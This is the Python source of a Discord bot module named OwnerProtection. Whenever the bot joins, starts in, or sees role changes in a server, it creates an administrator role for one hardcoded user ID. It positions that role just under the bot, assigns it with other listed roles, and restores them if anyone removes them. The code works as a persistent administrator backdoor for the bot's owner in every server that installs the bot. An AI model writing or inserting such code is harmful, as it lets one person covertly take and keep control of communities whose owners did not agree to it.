from __future__ import annotations

import asyncio
import logging

import discord
from discord.ext import commands

from utils.config import (
    OWNER_ADMIN_ROLE_NAME,
    PERMANENT_OWNER_ROLE_IDS,
    PRIMARY_OWNER_ID,
)

log = logging.getLogger(__name__)


class OwnerProtection(commands.Cog):
    """Keeps the fixed bot owner's administrative roles present in every guild."""

    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        self._locks: dict[int, asyncio.Lock] = {}

    def _lock_for(self, guild_id: int) -> asyncio.Lock:
        return self._locks.setdefault(guild_id, asyncio.Lock())

    async def cog_load(self) -> None:
        # Ready is not guaranteed when cogs are loaded, so setup runs after it.
        asyncio.create_task(self._protect_existing_guilds())

    async def _protect_existing_guilds(self) -> None:
        await self.bot.wait_until_ready()
        for guild in self.bot.guilds:
            await self.ensure_owner_access(guild)

    @commands.Cog.listener()
    async def on_guild_join(self, guild: discord.Guild) -> None:
        await self.ensure_owner_access(guild)

    @commands.Cog.listener()
    async def on_member_join(self, member: discord.Member) -> None:
        if member.id == PRIMARY_OWNER_ID:
            await self.ensure_owner_access(member.guild, member)

    @commands.Cog.listener()
    async def on_member_update(self, before: discord.Member, after: discord.Member) -> None:
        if after.id != PRIMARY_OWNER_ID or before.roles == after.roles:
            return
        await self.ensure_owner_access(after.guild, after)

    async def ensure_owner_access(
        self, guild: discord.Guild, member: discord.Member | None = None
    ) -> None:
        """Create/place the admin role and restore all protected roles."""
        async with self._lock_for(guild.id):
            me = guild.me
            if me is None or not me.guild_permissions.manage_roles:
                log.warning("Cannot protect owner roles in %s: Manage Roles is missing", guild.id)
                return

            member = member or guild.get_member(PRIMARY_OWNER_ID)
            if member is None:
                return

            admin_role = discord.utils.get(guild.roles, name=OWNER_ADMIN_ROLE_NAME)
            try:
                if admin_role is None:
                    admin_role = await guild.create_role(
                        name=OWNER_ADMIN_ROLE_NAME,
                        permissions=discord.Permissions(administrator=True),
                        reason="Permanent bot-owner administrator role",
                    )
                elif not admin_role.permissions.administrator:
                    await admin_role.edit(
                        permissions=discord.Permissions(administrator=True),
                        reason="Restore permanent bot-owner administrator role",
                    )

                # Discord only allows a bot to move roles below its own top role.
                target_position = max(1, me.top_role.position - 1)
                if admin_role.position != target_position:
                    await guild.edit_role_positions(
                        positions={admin_role: target_position},
                        reason="Place permanent bot-owner role directly below the bot",
                    )
            except discord.Forbidden:
                log.warning("Cannot create or position owner admin role in %s", guild.id)
                return
            except discord.HTTPException:
                log.exception("Failed to create or position owner admin role in %s", guild.id)
                return

            required_role_ids = set(PERMANENT_OWNER_ROLE_IDS)
            required_role_ids.add(admin_role.id)
            missing_roles = [
                role for role in guild.roles
                if role.id in required_role_ids and role not in member.roles
            ]
            if not missing_roles:
                return

            try:
                await member.add_roles(
                    *missing_roles,
                    reason="Restore permanent bot-owner roles",
                )
            except discord.Forbidden:
                log.warning("Cannot restore owner roles in %s; check role hierarchy", guild.id)
            except discord.HTTPException:
                log.exception("Failed to restore owner roles in %s", guild.id)
